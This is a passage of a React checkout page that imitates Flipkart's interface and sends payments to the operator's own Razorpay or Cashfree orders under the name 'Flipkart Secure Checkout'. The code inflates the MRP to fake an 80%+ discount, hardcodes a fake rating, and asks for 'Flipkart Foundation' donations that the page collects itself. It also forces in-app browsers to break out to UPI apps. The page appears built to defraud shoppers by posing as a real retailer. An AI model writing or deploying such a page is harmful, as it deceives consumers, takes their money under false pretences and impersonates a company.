// src/client/pages/checkout/FlipkartCheckoutPage.tsx
// Exact 3-Step Flipkart Checkout System (A/B Test Conversion Booster)
import React, { useState, useEffect, useMemo } from 'react'
import { useParams, useNavigate } from 'react-router-dom'
import { useQuery } from '@tanstack/react-query'
import { motion, AnimatePresence } from 'framer-motion'
import {
  ArrowLeft, ChevronRight, ChevronDown, ChevronUp, Check,
  ShieldCheck, AlertCircle, RefreshCw, X, MapPin, Building,
  CreditCard, Gift, HelpCircle, PhoneCall
} from 'lucide-react'
import { api, type Product } from '../../lib/api'
import { formatPrice, getSavedUtmParams, trackPixelEvent, getSanitizedCustomerPhone } from '../../lib/utils'
import { PhonePeIcon, GPayIcon, UpiGenericIcon } from '../../components/ui/UpiIcons'
import { detectInAppBrowser, triggerChromeBreakout } from '../../lib/inAppBrowser'
import { usePaymentGatewayInfo } from '../../lib/payment-gateway-config'
import { saveOrderSession } from '../../lib/orderSession'
import { trackPageView, trackUserClick, sendAnalyticsEvent } from '../../lib/analytics-tracker'

interface ShippingAddress {
  name: string
  flat: string
  area: string
  phone: string
  altPhone?: string
  type: 'home' | 'work'
}

const DEFAULT_ADDRESS_STORAGE_KEY = 'tvh_flipkart_address'

// User-specified Home Icon SVG
function FlipkartHomeIcon({ size = 16 }: { size?: number }) {
  return (
    <svg width={size} height={size} viewBox="0 0 16 16" fill="none" style={{ flexShrink: 0 }}>
      <path
        d="M5.52871 3.94173L3.52871 5.51315L3.52871 5.51316C2.77785 6.10312 2.40242 6.3981 2.20121 6.81208C2 7.22607 2 7.70345 2 8.65822V10.3571V10.3995C2 11.8997 2 12.6498 2.38197 13.1756C2.50533 13.3454 2.65464 13.4947 2.82443 13.618C3.35016 14 4.10011 14 5.6 14C5.97497 14 6.16246 14 6.29389 13.9045C6.33634 13.8737 6.37367 13.8363 6.40451 13.7939C6.5 13.6625 6.5 13.475 6.5 13.1V11C6.5 10.5286 6.5 10.2929 6.64645 10.1464C6.79289 10 7.0286 10 7.5 10H8.5C8.9714 10 9.20711 10 9.35355 10.1464C9.5 10.2929 9.5 10.5286 9.5 11V13.1C9.5 13.475 9.5 13.6625 9.59549 13.7939C9.62633 13.8363 9.66366 13.8737 9.70611 13.9045C9.83754 14 10.025 14 10.4 14C11.8999 14 12.6498 14 13.1756 13.618C13.3454 13.4947 13.4947 13.3454 13.618 13.1756C14 12.6498 14 11.8997 14 10.3995V10.3571V8.65822C14 7.70345 14 7.22607 13.7988 6.81208C13.5976 6.3981 13.2221 6.10312 12.4713 5.51315L10.4713 3.94172C9.28491 3.00957 8.69173 2.5435 8 2.5435C7.30827 2.5435 6.71509 3.00957 5.52871 3.94173Z"
        stroke="#1967F2"
        strokeWidth="1.2"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  )
}

function FlipkartBagIcon({ size = 20 }: { size?: number }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0 }}>
      <rect x="3" y="6" width="18" height="15" rx="3" fill="#2874F0" />
      <path d="M8 6V5C8 3.34315 9.34315 2 11 2H13C14.6569 2 16 3.34315 16 5V6" stroke="#FFE500" strokeWidth="2" strokeLinecap="round" />
      <path d="M7 11C7 13.7614 9.23858 16 12 16C14.7614 16 17 13.7614 17 11" stroke="#FFFFFF" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  )
}

function WhatsAppIcon({ size = 20 }: { size?: number }) {
  return (
    <span style={{
      width: size, height: size, borderRadius: '50%', background: '#25D366',
      display: 'inline-flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0
    }}>
      <svg width={size * 0.65} height={size * 0.65} viewBox="0 0 24 24" fill="#FFFFFF">
        <path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91C2.13 13.66 2.59 15.36 3.45 16.86L2.05 22L7.3 20.63C8.75 21.41 10.38 21.82 12.04 21.82C17.5 21.82 21.95 17.37 21.95 11.91C21.95 6.45 17.5 2 12.04 2ZM12.04 20.15C10.56 20.15 9.11 19.76 7.85 19.01L7.55 18.83L4.44 19.65L5.27 16.61L5.07 16.3C4.24 14.98 3.8 13.47 3.8 11.91C3.8 7.37 7.49 3.67 12.04 3.67C16.58 3.67 20.28 7.37 20.28 11.91C20.28 16.46 16.58 20.15 12.04 20.15ZM16.56 14.39C16.31 14.27 15.09 13.67 14.86 13.58C14.64 13.5 14.47 13.46 14.3 13.71C14.14 13.95 13.65 14.53 13.5 14.7C13.35 14.86 13.2 14.88 12.95 14.76C12.7 14.64 11.91 14.38 10.97 13.54C10.23 12.89 9.74 12.08 9.59 11.83C9.44 11.58 9.57 11.45 9.7 11.33C9.81 11.22 9.94 11.05 10.06 10.91C10.19 10.76 10.23 10.66 10.31 10.5C10.39 10.33 10.35 10.19 10.29 10.06C10.23 9.94 9.74 8.74 9.53 8.25C9.33 7.77 9.13 7.83 8.97 7.82L8.5 7.81C8.33 7.81 8.06 7.87 7.83 8.12C7.6 8.37 6.95 8.98 6.95 10.21C6.95 11.44 7.85 12.62 7.97 12.79C8.1 12.95 9.73 15.46 12.23 16.54C12.82 16.8 13.28 16.95 13.64 17.07C14.24 17.26 14.78 17.23 15.22 17.17C15.7 17.1 16.69 16.57 16.9 15.99C17.11 15.41 17.11 14.92 17.04 14.81C16.98 14.7 16.81 14.51 16.56 14.39Z" />
      </svg>
    </span>
  )
}

function PunjabNationalBankIcon({ size = 20 }: { size?: number }) {
  return (
    <span style={{
      width: size, height: size, borderRadius: 4, background: '#A20034',
      display: 'inline-flex', alignItems: 'center', justifyContent: 'center', color: '#FFF',
      fontWeight: 800, fontSize: Math.round(size * 0.45), flexShrink: 0
    }}>
      PNB
    </span>
  )
}

export default function FlipkartCheckoutPage() {
  const { slug } = useParams<{ slug: string }>()
  const navigate = useNavigate()

  // State: Step 2 (Confirm Details) vs Step 3 (Payments)
  const [currentStep, setCurrentStep] = useState<2 | 3>(2)

  // Address Modal State
  const [showAddressModal, setShowAddressModal] = useState(false)
  const [address, setAddress] = useState<ShippingAddress | null>(() => {
    try {
      const saved = localStorage.getItem(DEFAULT_ADDRESS_STORAGE_KEY)
      return saved ? JSON.parse(saved) : null
    } catch {
      return null
    }
  })

  // Address Form Draft (inside Modal)
  const [addrFlat, setAddrFlat] = useState(address?.flat || '')
  const [addrArea, setAddrArea] = useState(address?.area || '')
  const [addrName, setAddrName] = useState(address?.name || '')
  const [addrPhone, setAddrPhone] = useState(address?.phone || '')
  const [addrAltPhone, setAddrAltPhone] = useState(address?.altPhone || '')
  const [addrType, setAddrType] = useState<'home' | 'work'>(address?.type || 'home')
  const [addressError, setAddressError] = useState('')

  // Donation Selector State
  const [selectedDonation, setSelectedDonation] = useState<number | null>(null)

  // Payment Execution State
  const [isProcessingPayment, setIsProcessingPayment] = useState(false)
  const [paymentError, setPaymentError] = useState('')
  const [selectedUpiOption, setSelectedUpiOption] = useState<'phonepe' | 'gpay' | 'flipkart_upi' | 'pnb' | 'whatsapp'>('phonepe')
  const [isUpiExpanded, setIsUpiExpanded] = useState(true)

  // Gateway info
  const {
    isRazorpay,
    isBoth,
    defaultDualGateway,
  } = usePaymentGatewayInfo()

  // Load Product Data
  const { data: productData, isLoading: isProductLoading, error: productError } = useQuery({
    queryKey: ['product', slug],
    queryFn: () => api.products.get(slug!),
    enabled: Boolean(slug),
  })

  const product = productData

  // Handle Dynamic Delivery Date (3-4 days ahead like real Flipkart)
  const deliveryDateString = useMemo(() => {
    const d = new Date()
    d.setDate(d.getDate() + 3)
    const day = d.toLocaleDateString('en-US', { weekday: 'short' })
    const dateNum = d.getDate()
    const month = d.toLocaleDateString('en-US', { month: 'short' })
    return `${day}, ${dateNum} ${month}`
  }, [])

  // Price Calculation
  const effectivePrice = product?.sale_price ?? product?.price ?? 918
  // Realistic MRP calculation (flipkart 80-85% discount look)
  const mrp = useMemo(() => {
    if (!product) return 4999
    if (product.price && product.sale_price && product.price > product.sale_price) {
      return product.price
    }
    return Math.max(Math.round(effectivePrice * 4.5), 2999)
  }, [product, effectivePrice])

  const discountAmount = mrp - effectivePrice
  const discountPercent = Math.round((discountAmount / mrp) * 100)
  const protectPromiseFee = 19
  const totalAmount = effectivePrice + (selectedDonation || 0)

  // Sync address drafts when modal opens
  const openAddressModal = () => {
    setAddrFlat(address?.flat || '')
    setAddrArea(address?.area || 'East Champaran, Bihar, 845303')
    setAddrName(address?.name || '')
    setAddrPhone(address?.phone || '')
    setAddrAltPhone(address?.altPhone || '')
    setAddrType(address?.type || 'home')
    setAddressError('')
    setShowAddressModal(true)
  }

  const handleSaveAddress = (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    if (!addrName.trim()) {
      setAddressError('Please enter your full name')
      return
    }
    if (!addrFlat.trim()) {
      setAddressError('Please enter flat / house / building name')
      return
    }
    const cleanPhone = addrPhone.replace(/\D/g, '')
    if (cleanPhone.length < 10) {
      setAddressError('Please enter a valid 10-digit mobile number')
      return
    }

    const newAddr: ShippingAddress = {
      name: addrName.trim(),
      flat: addrFlat.trim(),
      area: addrArea.trim() || 'East Champaran, Bihar, 845303',
      phone: cleanPhone.slice(-10),
      altPhone: addrAltPhone.trim() || undefined,
      type: addrType,
    }

    setAddress(newAddr)
    try {
      localStorage.setItem(DEFAULT_ADDRESS_STORAGE_KEY, JSON.stringify(newAddr))
    } catch {}
    setShowAddressModal(false)
  }

  // Handle Browser Back Button in Checkout Stepper
  useEffect(() => {
    const handlePopState = (e: PopStateEvent) => {
      if (currentStep === 3) {
        e.preventDefault()
        setCurrentStep(2)
        window.history.pushState({ step: 2 }, '')
      }
    }
    window.addEventListener('popstate', handlePopState)
    return () => window.removeEventListener('popstate', handlePopState)
  }, [currentStep])

  // Track page view
  useEffect(() => {
    trackPageView(`/checkout/flipkart/${slug}`)
  }, [slug])

  // Execute Direct Payment Session on Step 3
  const handleProceedPayment = async () => {
    if (!product || isProcessingPayment) return
    setIsProcessingPayment(true)
    setPaymentError('')

    try {
      trackPixelEvent('AddPaymentInfo', {
        content_ids: [product.id],
        content_type: 'product',
        value: totalAmount,
        currency: 'INR',
      })
      trackUserClick('flipkart_pay_button_click', {
        product_id: product.id,
        app: selectedUpiOption,
        amount: totalAmount,
      }, product.id)

      const utm = getSavedUtmParams()
      const customerName = address?.name || 'Verified Flipkart Buyer'
      const customerPhone = address?.phone || '9801947855'

      const orderRes = await api.checkout.create({
        product_id: product.id,
        customer_name: customerName,
        customer_phone: customerPhone,
        preferred_gateway: isBoth ? (defaultDualGateway || 'razorpay') : isRazorpay ? 'razorpay' : 'cashfree',
        utm_source: utm.utm_source,
        utm_medium: utm.utm_medium,
        utm_campaign: utm.utm_campaign,
        referrer_url: document.referrer,
      })

      if (!orderRes.success || !orderRes.order_number) {
        throw new Error('Unable to create secure payment order. Please retry.')
      }

      // Save order session for recovery
      saveOrderSession({
        orderNumber: orderRes.order_number,
        productTitle: product.title,
        amount: totalAmount,
        createdAt: Date.now(),
      })

      const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
      const { isInApp, isAndroid } = detectInAppBrowser()

      // Preferred UPI Links
      let targetUpiUrl: string | undefined = undefined
      if (orderRes.upi_intent) {
        if (selectedUpiOption === 'phonepe' && orderRes.upi_intent.phonepe) {
          targetUpiUrl = orderRes.upi_intent.phonepe
        } else if (selectedUpiOption === 'gpay' && orderRes.upi_intent.gpay) {
          targetUpiUrl = orderRes.upi_intent.gpay
        } else {
          targetUpiUrl = orderRes.upi_intent.default || orderRes.upi_intent.phonepe || orderRes.upi_link || undefined
        }
      }
      if (!targetUpiUrl && orderRes.upi_link) {
        targetUpiUrl = orderRes.upi_link
      }
      if (!targetUpiUrl && orderRes.payment_url) {
        targetUpiUrl = orderRes.payment_url
      }

      // 1. Android Facebook / Instagram In-App Browser Breakout
      if (isMobile && isInApp && isAndroid && targetUpiUrl) {
        triggerChromeBreakout(targetUpiUrl)
        setTimeout(() => setIsProcessingPayment(false), 3000)
        return
      }

      // 2. Direct Mobile UPI launch
      if (isMobile && targetUpiUrl) {
        window.location.href = targetUpiUrl
        setTimeout(() => setIsProcessingPayment(false), 2500)
        return
      }

      // 3. Razorpay Modal fallback if on desktop or web gateway
      if (orderRes.gateway === 'razorpay' && (orderRes as any).razorpay_order_id) {
        if (!(window as any).Razorpay) {
          const script = document.createElement('script')
          script.src = 'https://checkout.razorpay.com/v1/checkout.js'
          await new Promise((res) => {
            script.onload = res
            script.onerror = res
            document.body.appendChild(script)
          })
        }
        if ((window as any).Razorpay) {
          const rzp = new (window as any).Razorpay({
            key: orderRes.razorpay_key_id,
            amount: Math.round(totalAmount * 100),
            currency: 'INR',
            name: 'Flipkart Secure Checkout',
            description: `Order #${orderRes.order_number}`,
            order_id: (orderRes as any).razorpay_order_id,
            prefill: {
              name: customerName,
              contact: customerPhone,
            },
            theme: { color: '#2874F0' },
            callback_url: `${window.location.origin}/payment/processing?order=${encodeURIComponent(orderRes.order_number)}`,
            handler: function () {
              navigate(`/payment/processing?order=${encodeURIComponent(orderRes.order_number)}`)
            },
          })
          rzp.open()
          setIsProcessingPayment(false)
          return
        }
      }

      // 4. Fallback payment URL redirect
      if (orderRes.payment_url) {
        window.location.href = orderRes.payment_url
        return
      }

      throw new Error('Payment gateway is initializing. Please try again.')
    } catch (err: any) {
      console.error('[Flipkart Checkout Error]', err)
      setPaymentError(err?.message || 'Payment initiation failed. Please try again.')
      setIsProcessingPayment(false)
    }
  }

  if (isProductLoading) {
    return (
      <div style={{
        minHeight: '100vh', background: '#F1F2F4', display: 'flex', flexDirection: 'column',
        alignItems: 'center', justifyContent: 'center', gap: 12, fontFamily: 'Inter, system-ui, sans-serif'
      }}>
        <RefreshCw size={28} className="spin" color="#2874F0" />
        <span style={{ fontSize: '0.9rem', color: '#555', fontWeight: 600 }}>Loading secure Flipkart checkout...</span>
      </div>
    )
  }

  if (productError || !product) {
    return (
      <div style={{
        minHeight: '100vh', background: '#F1F2F4', display: 'flex', flexDirection: 'column',
        alignItems: 'center', justifyContent: 'center', padding: 20, textAlign: 'center'
      }}>
        <AlertCircle size={44} color="#D32F2F" style={{ marginBottom: 12 }} />
        <h2 style={{ fontSize: '1.25rem', fontWeight: 700, color: '#212121', marginBottom: 8 }}>Product Not Found</h2>
        <p style={{ fontSize: '0.875rem', color: '#666', marginBottom: 20 }}>This product is unavailable or the link has expired.</p>
        <button
          onClick={() => navigate('/')}
          style={{
            padding: '10px 24px', background: '#2874F0', color: '#FFF',
            border: 'none', borderRadius: 4, fontWeight: 700, cursor: 'pointer'
          }}
        >
          Return to Store
        </button>
      </div>
    )
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: '#F1F2F4',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
      color: '#212121',
      paddingBottom: currentStep === 2 ? 96 : 32,
    }}>
      {/* ─── Top Main Navigation Bar ─── */}
      <header style={{
        background: '#FFFFFF',
        position: 'sticky',
        top: 0,
        zIndex: 40,
        boxShadow: '0 1px 3px rgba(0,0,0,0.08)',
      }}>
        {currentStep === 2 ? (
          /* Step 2 Header */
          <div>
            <div style={{
              display: 'flex', alignItems: 'center', height: 52, padding: '0 16px', gap: 16
            }}>
              <button
                type="button"
                onClick={() => navigate(`/product/${product.slug}`)}
                aria-label="Back"
                style={{
                  background: 'none', border: 'none', padding: 4, cursor: 'pointer',
                  display: 'flex', alignItems: 'center', color: '#212121'
                }}
              >
                <ArrowLeft size={22} />
              </button>
              <h1 style={{ fontSize: '1.15rem', fontWeight: 600, color: '#212121', margin: 0 }}>
                Confirm details
              </h1>
            </div>

            {/* Stepper (1 Address ✓ | 2 Confirm details ● | 3 Payment ○) */}
            <div style={{
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              padding: '6px 20px 14px', borderTop: '1px solid #F0F0F0'
            }}>
              <div style={{ display: 'flex', alignItems: 'center', width: '100%', maxWidth: 380 }}>
                {/* Step 1: Address */}
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', flex: 1 }}>
                  <div style={{
                    width: 22, height: 22, borderRadius: '50%', border: '1.8px solid #1967F2',
                    display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: 4, background: '#FFF'
                  }}>
                    <Check size={13} color="#1967F2" strokeWidth={3} />
                  </div>
                  <span style={{ fontSize: '0.78rem', color: '#1967F2', fontWeight: 600 }}>Address</span>
                </div>

                {/* Connecting Line 1 */}
                <div style={{ height: 1.5, background: '#1967F2', flex: 1, marginBottom: 18 }} />

                {/* Step 2: Confirm details (Active) */}
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', flex: 1.2 }}>
                  <div style={{
                    width: 24, height: 24, borderRadius: '50%', background: '#1967F2',
                    display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: 4, color: '#FFF',
                    fontWeight: 800, fontSize: '0.8rem', boxShadow: '0 2px 6px rgba(25, 103, 242, 0.35)'
                  }}>
                    2
                  </div>
                  <span style={{ fontSize: '0.82rem', color: '#212121', fontWeight: 700 }}>Confirm details</span>
                </div>

                {/* Connecting Line 2 */}
                <div style={{ height: 1.5, background: '#DCDCDC', flex: 1, marginBottom: 18 }} />

                {/* Step 3: Payment */}
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', flex: 1 }}>
                  <div style={{
                    width: 22, height: 22, borderRadius: '50%', border: '1.8px solid #BBB',
                    display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: 4, color: '#888',
                    fontWeight: 700, fontSize: '0.75rem', background: '#FFF'
                  }}>
                    3
                  </div>
                  <span style={{ fontSize: '0.78rem', color: '#888', fontWeight: 500 }}>Payment</span>
                </div>
              </div>
            </div>
          </div>
        ) : (
          /* Step 3 Header */
          <div style={{
            display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            height: 58, padding: '0 16px'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
              <button
                type="button"
                onClick={() => setCurrentStep(2)}
                aria-label="Back to Step 2"
                style={{
                  background: 'none', border: 'none', padding: 4, cursor: 'pointer',
                  display: 'flex', alignItems: 'center', color: '#212121'
                }}
              >
                <ArrowLeft size={22} />
              </button>
              <div>
                <div style={{ fontSize: '0.72rem', color: '#717478', lineHeight: 1 }}>Step 3 of 3</div>
                <h1 style={{ fontSize: '1.15rem', fontWeight: 700, color: '#212121', margin: '2px 0 0' }}>
                  Payments
                </h1>
              </div>
            </div>

            <div style={{
              display: 'flex', alignItems: 'center', gap: 4,
              fontSize: '0.8rem', fontWeight: 700, color: '#2E7D32', background: '#E8F5E9',
              padding: '4px 10px', borderRadius: 16
            }}>
              <span>🔒 100% Secure</span>
            </div>
          </div>
        )}
      </header>

      {/* ─── Main Content Container ─── */}
      <main style={{ maxWidth: 540, margin: '0 auto', padding: '12px 14px' }}>
        {/* ========================================================
            STEP 2: CONFIRM DETAILS (Screenshots 1, 3, 4)
           ======================================================== */}
        {currentStep === 2 && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            {/* 1. Delivering to Section */}
            <div>
              <div style={{
                fontSize: '1rem', fontWeight: 800, color: '#212121', marginBottom: 8, paddingLeft: 4
              }}>
                Delivering to
              </div>

              <div style={{
                background: '#FFFFFF', borderRadius: 16, padding: '16px 18px',
                boxShadow: '0 1px 3px rgba(0,0,0,0.06)'
              }}>
                {address ? (
                  /* Address Filled State (Matches Screenshot 1) */
                  <div>
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                        <FlipkartHomeIcon size={18} />
                        <span style={{ fontWeight: 800, fontSize: '0.98rem', color: '#212121' }}>
                          {address.name}
                        </span>
                      </div>
                      <button
                        type="button"
                        onClick={openAddressModal}
                        style={{
                          background: 'none', border: 'none', color: '#1967F2', fontWeight: 800,
                          fontSize: '0.92rem', cursor: 'pointer', padding: 0
                        }}
                      >
                        Change
                      </button>
                    </div>

                    <div style={{
                      fontSize: '0.84rem', color: '#333', lineHeight: 1.45, marginBottom: 8, paddingLeft: 26
                    }}>
                      {address.flat}, {address.area}
                    </div>

                    <div style={{
                      display: 'flex', alignItems: 'center', gap: 6, fontSize: '0.84rem',
                      color: '#212121', fontWeight: 600, paddingLeft: 26
                    }}>
                      <span>📞</span>
                      <span>{address.phone}</span>
                    </div>
                  </div>
                ) : (
                  /* Address Unfilled / Default Prompt State (Matches User Requirement) */
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                      <FlipkartHomeIcon size={20} />
                      <div>
                        <div style={{ fontWeight: 700, fontSize: '0.92rem', color: '#212121' }}>
                          Add delivery address
                        </div>
                        <div style={{ fontSize: '0.78rem', color: '#878787', marginTop: 2 }}>
                          Tap to enter house name, area & mobile number
                        </div>
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={openAddressModal}
                      style={{
                        background: '#F0F5FF', border: '1px solid #D0E1FD', color: '#1967F2',
                        fontWeight: 700, fontSize: '0.82rem', cursor: 'pointer', padding: '6px 14px',
                        borderRadius: 6, display: 'flex', alignItems: 'center', gap: 4
                      }}
                    >
                      <span>+ Add Address</span>
                    </button>
                  </div>
                )}
              </div>
            </div>

            {/* 2. Pay using SuperCoins Card (Screenshot 1) */}
            <div style={{
              background: '#FFFFFF', borderRadius: 16, padding: '14px 18px',
              display: 'flex', alignItems: 'center', justifyContent: 'space-between',
              boxShadow: '0 1px 3px rgba(0,0,0,0.06)'
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                <img
                  src="https://shop.rooter.gg/images/supercoins.webp"
                  alt="SuperCoins"
                  style={{ width: 28, height: 28, objectFit: 'contain' }}
                  loading="lazy"
                />
                <div>
                  <div style={{ fontWeight: 700, fontSize: '0.92rem', color: '#717478' }}>
                    Pay using SuperCoins
                  </div>
                  <div style={{ fontSize: '0.78rem', color: '#A0A0A0', marginTop: 1 }}>
                    Available balance: 0
                  </div>
                </div>
              </div>
            </div>

            {/* 3. Product Summary Card (Screenshot 1) */}
            <div style={{
              background: '#FFFFFF', borderRadius: 16, padding: '16px',
              boxShadow: '0 1px 3px rgba(0,0,0,0.06)', display: 'flex', flexDirection: 'column', gap: 12
            }}>
              <div style={{ display: 'flex', gap: 14 }}>
                {/* Left: Thumbnail + Stepper */}
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', width: 84, flexShrink: 0 }}>
                  <img
                    src={product.thumbnail_url || product.images?.[0]?.url || 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=200'}
                    alt={product.title}
                    style={{
                      width: 80, height: 80, objectFit: 'cover', borderRadius: 8,
                      border: '1px solid #ECECEC'
                    }}
                  />
                  {/* Quantity Stepper (1) */}
                  <div style={{
                    display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                    width: 78, height: 26, border: '1px solid #DCDCDC', borderRadius: 4,
                    marginTop: 8, padding: '0 4px', background: '#FAFAFA'
                  }}>
                    <span style={{ fontSize: '0.9rem', color: '#BBB', fontWeight: 700, cursor: 'default' }}>−</span>
                    <span style={{ fontSize: '0.85rem', fontWeight: 800, color: '#212121' }}>1</span>
                    <span style={{ fontSize: '0.9rem', color: '#BBB', fontWeight: 700, cursor: 'default' }}>+</span>
                  </div>
                </div>

                {/* Right: Product Details */}
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontSize: '0.72rem', fontWeight: 800, color: '#1B7A2F', marginBottom: 2 }}>
                    Top Discount of the Sale
                  </div>
                  <div style={{
                    fontSize: '0.95rem', fontWeight: 600, color: '#212121', lineHeight: 1.3,
                    overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap'
                  }}>
                    {product.title}
                  </div>
                  <div style={{ fontSize: '0.78rem', color: '#717478', marginTop: 2 }}>
                    {product.category_name || 'Instant Access, Full License'}
                  </div>

                  {/* Rating Pill */}
                  <div style={{ display: 'flex', alignItems: 'center', gap: 4, marginTop: 4 }}>
                    <span style={{
                      background: '#388E3C', color: '#FFF', fontSize: '0.72rem', fontWeight: 800,
                      padding: '1px 6px', borderRadius: 4, display: 'inline-flex', alignItems: 'center', gap: 2
                    }}>
                      4.1 ★
                    </span>
                    <span style={{ fontSize: '0.74rem', color: '#878787' }}>5.1L+</span>
                  </div>

                  {/* Pricing Row */}
                  <div style={{ display: 'flex', alignItems: 'baseline', gap: 6, marginTop: 6, flexWrap: 'wrap' }}>
                    <span style={{ color: '#388E3C', fontWeight: 800, fontSize: '0.95rem' }}>
                      ↓{discountPercent}%
                    </span>
                    <span style={{ textDecoration: 'line-through', color: '#878787', fontSize: '0.88rem' }}>
                      ₹{mrp.toLocaleString('en-IN')}
                    </span>
                    <span style={{ color: '#212121', fontWeight: 900, fontSize: '1.15rem' }}>
                      ₹{effectivePrice.toLocaleString('en-IN')}
                    </span>
                  </div>

                  {/* Protect Promise Fee */}
                  <div style={{
                    display: 'flex', alignItems: 'center', gap: 2, fontSize: '0.76rem',
                    color: '#717478', marginTop: 4, cursor: 'pointer'
                  }}>
                    <span>+₹19 Protect Promise Fee</span>
                    <ChevronRight size={13} color="#717478" />
                  </div>
                </div>
              </div>

              {/* Delivery Banner (Sun, 18 Oct dynamic) */}
              <div style={{
                background: '#F5F7FA', borderRadius: 8, padding: '10px 14px',
                display: 'flex', alignItems: 'center', gap: 8, fontSize: '0.82rem', color: '#212121'
              }}>
                <span style={{ fontSize: '1rem' }}>🚚</span>
                <div>
                  Delivery by <strong style={{ fontWeight: 800 }}>{deliveryDateString}</strong>
                </div>
              </div>

              {/* Open Box Delivery */}
              <div style={{
                background: '#F5F7FA', borderRadius: 8, padding: '10px 14px',
                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                fontSize: '0.82rem', color: '#212121', cursor: 'pointer'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                  <span style={{ fontSize: '1rem' }}>📦</span>
                  <span><strong style={{ fontWeight: 700 }}>Open Box Delivery</strong> will be done</span>
                </div>
                <ChevronRight size={15} color="#717478" />
              </div>
            </div>

            {/* 4. WOW! Savings Zone (Screenshot 3) */}
            <div style={{
              background: '#F0F7FF', border: '1px solid #D6E8FD', borderRadius: 16,
              padding: '12px 16px', display: 'flex', alignItems: 'center', justifyContent: 'space-between'
            }}>
              <div>
                <div style={{ fontWeight: 800, fontSize: '0.88rem', color: '#1967F2', display: 'flex', alignItems: 'center', gap: 4 }}>
                  <span>WOW!</span>
                  <span style={{ color: '#212121' }}>Savings zone</span>
                </div>
                <div style={{ fontSize: '0.82rem', color: '#1967F2', fontWeight: 700, marginTop: 2, display: 'flex', alignItems: 'center', gap: 2 }}>
                  <span>View all coupons and offers</span>
                  <ChevronRight size={14} />
                </div>
              </div>
            </div>

            {/* 5. Flipkart Foundation Card (Screenshot 3 & 4) */}
            <div style={{
              background: '#FFFFFF', borderRadius: 16, padding: '16px',
              boxShadow: '0 1px 3px rgba(0,0,0,0.06)'
            }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: 12 }}>
                <div style={{ flex: 1 }}>
                  <div style={{ fontWeight: 800, fontSize: '0.95rem', color: '#212121', marginBottom: 2 }}>
                    You can make a difference!
                  </div>
                  <div style={{ fontSize: '0.78rem', color: '#717478', lineHeight: 1.35, marginBottom: 10 }}>
                    Help Flipkart Foundation in empowering our local communities.
                  </div>

                  {/* Donation Chips */}
                  <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
                    {[10, 20, 50, 100].map(amt => {
                      const isSelected = selectedDonation === amt
                      return (
                        <button
                          key={amt}
                          type="button"
                          onClick={() => setSelectedDonation(prev => prev === amt ? null : amt)}
                          style={{
                            padding: '6px 14px', borderRadius: 6,
                            border: isSelected ? '1.5px solid #1967F2' : '1px solid #D0D0D0',
                            background: isSelected ? '#F0F5FF' : '#FFFFFF',
                            color: isSelected ? '#1967F2' : '#212121',
                            fontWeight: 700, fontSize: '0.85rem', cursor: 'pointer',
                            transition: 'all 0.15s ease'
                          }}
                        >
                          ₹{amt}
                        </button>
                      )
                    })}
                  </div>
                  <div style={{ fontSize: '0.72rem', color: '#9E9E9E', marginTop: 8 }}>
                    Note: GST and No Cost EMI not applicable
                  </div>
                </div>

                {/* Heart Illustration */}
                <div style={{
                  width: 58, height: 58, borderRadius: 12, background: 'linear-gradient(135deg, #FFE4E6 0%, #FECDD3 100%)',
                  display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '1.8rem', flexShrink: 0
                }}>
                  💖
                </div>
              </div>
            </div>

            {/* 6. Price Details Card (Screenshot 3 & 4) */}
            <div>
              <div style={{ fontSize: '1rem', fontWeight: 800, color: '#212121', marginBottom: 8, paddingLeft: 4 }}>
                Price Details
              </div>

              <div style={{
                background: '#FFFFFF', borderRadius: 16, padding: '16px 18px',
                boxShadow: '0 1px 3px rgba(0,0,0,0.06)'
              }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 10, fontSize: '0.86rem' }}>
                  <span style={{ borderBottom: '1px dashed #A0A0A0', paddingBottom: 1, color: '#212121' }}>
                    MRP (incl. of all taxes)
                  </span>
                  <span style={{ fontWeight: 600, color: '#212121' }}>
                    ₹{mrp.toLocaleString('en-IN')}
                  </span>
                </div>

                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 10, fontSize: '0.86rem' }}>
                  <span style={{ borderBottom: '1px dashed #A0A0A0', paddingBottom: 1, color: '#212121' }}>
                    Protect Promise Fee (1)
                  </span>
                  <span style={{ fontWeight: 600, color: '#212121' }}>
                    ₹{protectPromiseFee}
                  </span>
                </div>

